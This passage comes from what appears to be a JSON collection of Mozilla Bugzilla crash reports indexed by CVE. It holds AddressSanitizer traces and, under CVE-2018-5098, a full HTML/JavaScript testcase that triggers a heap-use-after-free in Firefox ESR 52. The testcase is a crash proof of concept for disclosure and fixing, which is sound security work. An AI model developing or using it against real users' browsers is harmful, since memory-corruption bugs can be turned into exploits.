/home/worker/workspace/build/src/parser/expat/lib/xmlparse.c:3812:10 #11 0x7fe87365c0bd in prologInitProcessor /home/worker/workspace/build/src/parser/expat/lib/xmlparse.c:3629 #12 0x7fe87365a391 in MOZ_XML_Parse /home/worker/workspace/build/src/parser/expat/lib/xmlparse.c:1530:17 #13 0x7fe86cba7897 in nsExpatDriver::ParseBuffer(char16_t const*, unsigned int, bool, unsigned int*) /home/worker/workspace/build/src/parser/htmlparser/nsExpatDriver.cpp:1012:16 #14 0x7fe86cba8b42 in nsExpatDriver::ConsumeToken(nsScanner&, bool&) /home/worker/workspace/build/src/parser/htmlparser/nsExpatDriver.cpp:1110:5 #15 0x7fe86cbb56d0 in nsParser::Tokenize(bool) /home/worker/workspace/build/src/parser/htmlparser/nsParser.cpp:1539:30 #16 0x7fe86cbb0f15 in nsParser::ResumeParse(bool, bool, bool) /home/worker/workspace/build/src/parser/htmlparser/nsParser.cpp:1056:41 #17 0x7fe86cbb68ea in nsParser::OnDataAvailable(nsIRequest*, nsISupports*, nsIInputStream*, unsigned long, unsigned int) /home/worker/workspace/build/src/parser/htmlparser/nsParser.cpp:1437:12 #18 0x7fe86b12ab5b in nsBaseChannel::OnDataAvailable(nsIRequest*, nsISupports*, nsIInputStream*, unsigned long, unsigned int) /home/worker/workspace/build/src/netwerk/base/nsBaseChannel.cpp:902:28 #19 0x7fe86b1795d4 in nsInputStreamPump::OnStateTransfer() /home/worker/workspace/build/src/netwerk/base/nsInputStreamPump.cpp:615:33 #20 0x7fe86b1782c8 in nsInputStreamPump::OnInputStreamReady(nsIAsyncInputStream*) /home/worker/workspace/build/src/netwerk/base/nsInputStreamPump.cpp:443:25 #21 0x7fe86af7115d in nsInputStreamReadyEvent::Run() /home/worker/workspace/build/src/xpcom/io/nsStreamUtils.cpp:97:20 #22 0x7fe86afa8c60 in mozilla::SchedulerGroup::Runnable::Run() /home/worker/workspace/build/src/xpcom/threads/SchedulerGroup.cpp:356:25 #23 0x7fe86afd64ce in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1446:14 #24 0x7fe86afdc748 in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:480:10 #25 0x7fe86bdee181 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:97:21 #26 0x7fe86bd4b64b in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:326:10 #27 0x7fe86bd4b64b in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:319 #28 0x7fe86bd4b64b in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:299 #29 0x7fe87159c08f in nsBaseAppShell::Run() /home/worker/workspace/build/src/widget/nsBaseAppShell.cpp:156:27 #30 0x7fe875873c77 in XRE_RunAppShell() /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:882:22 #31 0x7fe86bd4b64b in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:326:10 #32 0x7fe86bd4b64b in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:319 #33 0x7fe86bd4b64b in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:299 #34 0x7fe8758736e0 in XRE_InitChildProcess(int, char**, XREChildData const*) /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:699:34 #35 0x4eb843 in content_process_main /home/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:64:30 #36 0x4eb843 in main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:285 #37 0x7fe8888e182f in __libc_start_main /build/glibc-bfm8X4/glibc-2.23/csu/../csu/libc-start.c:291 SUMMARY: AddressSanitizer: heap-use-after-free /home/worker/workspace/build/src/obj-firefox/dist/include/nsINode.h:1602:12 in GetBoolFlag Shadow bytes around the buggy address: 0x0c188002ab90: fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa 0x0c188002aba0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c188002abb0: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd 0x0c188002abc0: fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa 0x0c188002abd0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa =>0x0c188002abe0: fa fa fa fa fa fa fa fa fd fd fd[fd]fd fd fd fd 0x0c188002abf0: fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa 0x0c188002ac00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c188002ac10: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 0x0c188002ac20: 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa 0x0c188002ac30: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb ==6027==ABORTING"
      }
    ],
    "CVE-2018-5098": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1399400",
        "title": "heap-use-after-free in nsGenericHTMLElement::GetFormControlFrame",
        "description": "The following testcase crashes the latest ASAN build of Firefox ESR 52.3.1 (BuildID=20170912172710). It requires the fuzzPriv extension to trigger reliably. <script> function start() { o0=document.createElement('iframe'); document.body.appendChild(o0); o1=window.open('data:text/html,<div><div><div>','popup35','height=134'); o1.onload=fun0; } function fun0(e) { o5=e.target; o1.onresize=fun2; tmp=o5.getElementsByTagName('*');; o6=tmp[0]; o7=tmp[1]; o8=tmp[3]; o15=document.createElement('input'); o20=document.createElement('marquee'); o20.addEventListener('DOMAttrModified',fun1); o8.appendChild(o20); o7.replaceWith(o15); } function fun1() { o15.type='number'; o1.resizeTo(57,100); o5.removeChild(o6); o5.appendChild(o6); o15.select(); } function fun2() { window.top.document.documentElement.appendChild(o15); fuzzPriv.GC();fuzzPriv.CC();fuzzPriv.GC();fuzzPriv.CC(); } </script> <body onload=\"start()\"></body> ASAN output: ================================================================= ==29513==ERROR: AddressSanitizer: heap-use-after-free on address 0x6150005339b0 at pc 0x7f51ef4b0479 bp 0x7ffdbbad88e0 sp 0x7ffdbbad88d8 READ of size 4 at 0x6150005339b0 thread T0 #0 0x7f51ef4b0478 in GetBoolFlag /home/worker/workspace/build/src/dom/base/nsINode.h:1630:12 #1 0x7f51ef4b0478 in IsInUncomposedDoc /home/worker/workspace/build/src/dom/base/nsINode.h:526 #2 0x7f51ef4b0478 in GetPrimaryFrame /home/worker/workspace/build/src/obj-firefox/dist/include/nsIContent.h:916 #3 0x7f51ef4b0478 in GetPrimaryFrame /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/Element.h:964 #4 0x7f51ef4b0478 in nsGenericHTMLElement::GetFormControlFrame(bool) /home/worker/workspace/build/src/dom/html/nsGenericHTMLElement.cpp:1005 #5 0x7f51ef3566ba in SelectAll /home/worker/workspace/build/src/dom/html/HTMLInputElement.cpp:3766:43 #6 0x7f51ef3566ba in mozilla::dom::HTMLInputElement::Select() /home/worker/workspace/build/src/dom/html/HTMLInputElement.cpp:3724 #7 0x7f51ef3563b7 in mozilla::dom::HTMLInputElement::Select() /home/worker/workspace/build/src/dom/html/HTMLInputElement.cpp:3688:14 #8 0x7f51eea54770 in mozilla::dom::HTMLInputElementBinding::select(JSContext*, JS::Handle<JSObject*>, mozilla::dom::HTMLInputElement*, JSJitMethodCallArgs const&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/HTMLInputElementBinding.cpp:2769:3 #9 0x7f51eed10399 in mozilla::dom::GenericBindingMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:2904:13 #10 0x7f51f5095085 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:239:15 #11 0x7f51f5095085 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:447 #12 0x7f51f5095d32 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:523:10 #13 0x7f51f4e043ac in js::Wrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/Wrapper.cpp:165:12 #14 0x7f51f4dd39df in js::CrossCompartmentWrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/CrossCompartmentWrapper.cpp:333:14 #15 0x7f51f4de14cf in js::Proxy::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:400:12 #16 0x7f51f4de3c7e in js::proxy_Call(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:689:12 #17 0x7f51f5095085 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:239:15 #18 0x7f51f5095085 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:447 #19 0x7f51f507548f in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:510:12 #20 0x7f51f507548f in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2922 #21 0x7f51f505a64d in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:405:12 #22 0x7f51f50956ef in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:477:15 #23 0x7f51f5095d32 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:523:10 #24 0x7f51f4b66b8d in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2828:12 #25 0x7f51ee6fcd6c in mozilla::dom::EventListener::HandleEvent(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, mozilla::ErrorResult&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/EventListenerBinding.cpp:47:8 #26 0x7f51ef0f43e2 in HandleEvent<mozilla::dom::EventTarget *> /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventListenerBinding.h:64:12 #27 0x7f51ef0f43e2 in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, nsIDOMEvent*, mozilla::dom::EventTarget*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1130 #28 0x7f51ef0f5e57 in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1287:17 #29 0x7f51ef0e0e79 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:401:9 #30 0x7f51ef0e4248 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:711:9 #31 0x7f51ef0e6147 in mozilla::EventDispatcher::DispatchDOMEvent(nsISupports*, mozilla::WidgetEvent*, nsIDOMEvent*, nsPresContext*, nsEventStatus*) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:780:12 #32 0x7f51ed2d18f1 in nsINode::DispatchEvent(nsIDOMEvent*, bool*) /home/worker/workspace/build/src/dom/base/nsINode.cpp:1309:5 #33 0x7f51ef07eb16 in mozilla::AsyncEventDispatcher::Run() /home/worker/workspace/build/src/dom/events/AsyncEventDispatcher.cpp:54:3 #34 0x7f51ecdd918e in nsContentUtils::RemoveScriptBlocker() /home/worker/workspace/build/src/dom/base/nsContentUtils.cpp:5195:5 #35 0x7f51ed1d4cf4 in nsDocument::EndUpdate(unsigned int) /home/worker/workspace/build/src/dom/base/nsDocument.cpp:4795:3 #36 0x7f51ef4eff8c in nsHTMLDocument::EndUpdate(unsigned int) /home/worker/workspace/build/src/dom/html/nsHTMLDocument.cpp:2424:3 #37 0x7f51f0eab795 in ~mozAutoDocConditionalContentUpdateBatch /home/worker/workspace/build/src/dom/base/mozAutoDocUpdate.h:83:7 #38 0x7f51f0eab795 in nsDOMCSSDeclaration::ParsePropertyValue(nsCSSPropertyID, nsAString_internal const&, bool) /home/worker/workspace/build/src/layout/style/nsDOMCSSDeclaration.cpp:319 #39 0x7f51ed6b157b in SetMargin /home/worker/workspace/build/src/layout/style/nsCSSPropList.h:2474:1 #40 0x7f51ed6b157b in mozilla::dom::CSS2PropertiesBinding::set_margin(JSContext*, JS::Handle<JSObject*>, nsDOMCSSDeclaration*, JSJitSetterCallArgs) /home/worker/workspace/build/src/obj-firefox/dom/bindings/CSS2PropertiesBinding.cpp:24459 #41 0x7f51eed0f75c in mozilla::dom::GenericBindingSetter(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:2865:8 #42 0x7f51f5095085 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:239:15 #43 0x7f51f5095085 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:447 #44 0x7f51f5096dc8 in Call /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:523:10 #45 0x7f51f5096dc8 in js::CallSetter(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::Handle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:650 #46 0x7f51f50fc26d in SetExistingProperty /home/worker/workspace/build/src/js/src/vm/NativeObject.cpp:2434:10 #47 0x7f51f50fc26d in js::NativeSetProperty(JSContext*, JS::Handle<js::NativeObject*>, JS::Handle<jsid>, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::QualifiedBool, JS::ObjectOpResult&) /home/worker/workspace/build/src/js/src/vm/NativeObject.cpp:2469 #48 0x7f51f4dad9a8 in SetProperty /home/worker/workspace/build/src/js/src/vm/NativeObject.h:1540:12 #49 0x7f51f4dad9a8 in js::SetPropertyIgnoringNamedGetter(JSContext*, JS::Handle<JSObject*>, JS::Handle<jsid>, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::Handle<JS::PropertyDescriptor>, JS::ObjectOpResult&) /home/worker/workspace/build/src/js/src/proxy/BaseProxyHandler.cpp:182 #50 0x7f51eed1a985 in mozilla::dom::DOMProxyHandler::set(JSContext*, JS::Handle<JSObject*>, JS::Handle<jsid>, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::ObjectOpResult&) const /home/worker/workspace/build/src/dom/bindings/DOMJSProxyHandler.cpp:258:10 #51 0x7f51f4ddfc31 in js::Proxy::set(JSContext*, JS::Handle<JSObject*>, JS::Handle<jsid>, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::ObjectOpResult&) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:333:12 #52 0x7f51f4cbdb9a in JSObject::nonNativeSetProperty(JSContext*, JS::Handle<JSObject*>, JS::Handle<jsid>, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::ObjectOpResult&) /home/worker/workspace/build/src/js/src/jsobj.cpp:1022:12 #53 0x7f51f506e16f in SetProperty /home/worker/workspace/build/src/js/src/vm/NativeObject.h:1539:16 #54 0x7f51f506e16f in SetPropertyOperation /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:259 #55 0x7f51f506e16f in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2715 #56 0x7f51f505a64d in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:405:12 #57 0x7f51f50956ef in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:477:15 #58 0x7f51f5095d32 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:523:10 #59 0x7f51f4b64922 in JS_CallFunctionValue(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2769:12 #60 0x7f51f058736b in Call /home/worker/workspace/build/src/obj-firefox/dist/include/jsapi.h:3310:14 #61 0x7f51f058736b in nsXBLProtoImplAnonymousMethod::Execute(nsIContent*, JSAddonId*) /home/worker/workspace/build/src/dom/xbl/nsXBLProtoImplMethod.cpp:331 #62 0x7f51f0550f1e in nsXBLBinding::ExecuteAttachedHandler() /home/worker/workspace/build/src/dom/xbl/nsXBLBinding.cpp:634:5 #63 0x7f51f0550d1e in nsBindingManager::ProcessAttachedQueueInternal(unsigned int) /home/worker/workspace/build/src/dom/xbl/nsBindingManager.cpp:419:7 #64 0x7f51f137ce69 in ProcessAttachedQueue /home/worker/workspace/build/src/dom/xbl/nsBindingManager.h:105:5 #65 0x7f51f137ce69 in PresShell::FlushPendingNotifications(mozilla::ChangesToFlush) /home/worker/workspace/build/src/layout/base/nsPresShell.cpp:4175 #66 0x7f51f108e9dc in nsRefreshDriver::Tick(long, mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:1836:11 #67 0x7f51f109b221 in mozilla::RefreshDriverTimer::TickRefreshDrivers(long, mozilla::TimeStamp, nsTArray<RefPtr<nsRefreshDriver> >&) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:295:7 #68 0x7f51f109acb5 in mozilla::RefreshDriverTimer::Tick(long, mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:316:5 #69 0x7f51f109d7de in applyImpl<mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver, void (mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver::*)(mozilla::TimeStamp), StoreCopyPassByValue<mozilla::TimeStamp> , 0> /home/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:775:12 #70 0x7f51f109d7de in apply<mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver, void (mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver::*)(mozilla::TimeStamp)> /home/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:781 #71 0x7f51f109d7de in mozilla::detail::RunnableMethodImpl<void (mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver::*)(mozilla::TimeStamp), true, false, mozilla::TimeStamp>::Run() /home/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:810 #72 0x7f51ea58149b in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1216:7 #73 0x7f51ea6035dc in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/glue/nsThreadUtils.cpp:361:10 #74 0x7f51eb3bc25f in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:96:21 #75 0x7f51eb32ddb8 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:232:3 #76 0x7f51eb32ddb8 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:225 #77 0x7f51eb32ddb8 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:205 #78 0x7f51f09c29af in nsBaseAppShell::Run() /home/worker/workspace/build/src/widget/nsBaseAppShell.cpp:156:3 #79 0x7f51f2a3ff71 in nsAppStartup::Run() /home/worker/workspace/build/src/toolkit/components/startup/nsAppStartup.cpp:283:19 #80 0x7f51f2bd7287 in XREMain::XRE_mainRun() /home/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4488:10 #81 0x7f51f2bd89fd in XREMain::XRE_main(int, char**, nsXREAppData const*) /home/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4621:8 #82 0x7f51f2bd98bc in XRE_main /home/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4712:16 #83 0x4df91a in do_main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:282:10 #84 0x4df91a in main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:415 #85 0x7f5205fca82f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f) #86 0x41ba88 in _start (/fuzzer3/esr/firefox/firefox+0x41ba88) 0x6150005339b0 is located 48 bytes inside of 496-byte region [0x615000533980,0x615000533b70) freed by thread T0 here: #0 0x4b21db in __interceptor_free /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:38:3 #1 0x7f51ea449f34 in SnowWhiteKiller::~SnowWhiteKiller() /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2665:9 #2 0x7f51ea449b26 in nsCycleCollector::FreeSnowWhite(bool) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2840:3 #3 0x7f51ea450bfe in nsCycleCollector::BeginCollection(ccType, nsICycleCollectorListener*) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3826:3 #4 0x7f51ea4500bc in nsCycleCollector::Collect(ccType, js::SliceBudget&, nsICycleCollectorListener*, bool) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3651:9 #5 0x7f51ea454136 in nsCycleCollector_collect(nsICycleCollectorListener*) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:4144:3 #6 0x7f51ed2ed6c9 in nsJSContext::CycleCollectNow(nsICycleCollectorListener*, int) /home/worker/workspace/build/src/dom/base/nsJSEnvironment.cpp:1440:3 #7 0x7f51ece173bd in nsDOMWindowUtils::CycleCollect(nsICycleCollectorListener*, int) /home/worker/workspace/build/src/dom/base/nsDOMWindowUtils.cpp:1340:3 #8 0x7f51ea5a9aa6 in NS_InvokeByIndex /home/worker/workspace/build/src/xpcom/reflect/xptcall/md/unix/xptcinvoke_x86_64_unix.cpp:180:23 #9 0x7f51ebdcec1e in Invoke /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:2058:12 #10 0x7f51ebdcec1e in Call /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:1377 #11 0x7f51ebdcec1e in XPCWrappedNative::CallMethod(XPCCallContext&, XPCWrappedNative::CallMode) /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:1344 #12 0x7f51ebdd62a8 in XPC_WN_CallMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNativeJSOps.cpp:1000:12 #13 0x7f51f5095085 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:239:15 #14 0x7f51f5095085 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:447 #15 0x7f51f507548f in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:510:12 #16 0x7f51f507548f in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2922 #17 0x7f51f505a64d in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:405:12 #18 0x7f51f50956ef in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:477:15 #19 0x7f51f5095d32 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:523:10 #20 0x7f51f4b64922 in JS_CallFunctionValue(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2769:12 #21 0x7f51ebcf65cf in xpc::FunctionForwarder(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/xpconnect/src/ExportHelpers.cpp:315:18 #22 0x7f51f5095085 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:239:15 #23 0x7f51f5095085 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:447 #24 0x7f51f507548f in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:510:12 #25 0x7f51f507548f in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2922 #26 0x7f51f505a64d in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:405:12 #27 0x7f51f50956ef in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:477:15 #28 0x7f51f5095d32 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:523:10 #29 0x7f51f4e043ac in js::Wrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/Wrapper.cpp:165:12 #30 0x7f51f4dd39df in js::CrossCompartmentWrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/CrossCompartmentWrapper.cpp:333:14 #31 0x7f51f4de14cf in js::Proxy::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:400:12 #32 0x7f51f4de3c7e in js::proxy_Call(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:689:12 #33 0x7f51f5095085 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:239:15 #34 0x7f51f5095085 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:447 #35 0x7f51f5095d32 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:523:10 #36 0x7f51f4b66b8d in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2828:12 previously allocated by thread T0 here: #0 0x4b24fb in malloc /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:52:3 #1 0x4e0ded in moz_xmalloc /home/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:83:17 #2 0x7f51ef3215a9 in operator new /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:194:12 #3 0x7f51ef3215a9 in NS_NewHTMLInputElement(already_AddRefed<mozilla::dom::NodeInfo>&&, mozilla::dom::FromParser) /home/worker/workspace/build/src/dom/html/HTMLInputElement.cpp:129 #4 0x7f51ef4c8456 in CreateHTMLElement /home/worker/workspace/build/src/dom/html/nsHTMLContentSink.cpp:291:41 #5 0x7f51ef4c8456 in NS_NewHTMLElement(mozilla::dom::Element**, already_AddRefed<mozilla::dom::NodeInfo>&&, mozilla::dom::FromParser, nsAString_internal const*) /home/worker/workspace/build/src/dom/html/nsHTMLContentSink.cpp:263 #6 0x7f51ed226afe in nsIDocument::CreateHTMLElement(nsIAtom*) /home/worker/workspace/build/src/dom/base/nsDocument.cpp:12559:28 #7 0x7f51f174853d in nsNumberControlFrame::MakeAnonymousElement(mozilla::dom::Element**, nsTArray<nsIAnonymousContentCreator::ContentInfo>&, nsIAtom*, mozilla::CSSPseudoElementType, nsStyleContext*) /home/worker/workspace/build/src/layout/forms/nsNumberControlFrame.cpp:333:35 #8 0x7f51f174907b in nsNumberControlFrame::CreateAnonymousContent(nsTArray<nsIAnonymousContentCreator::ContentInfo>&) 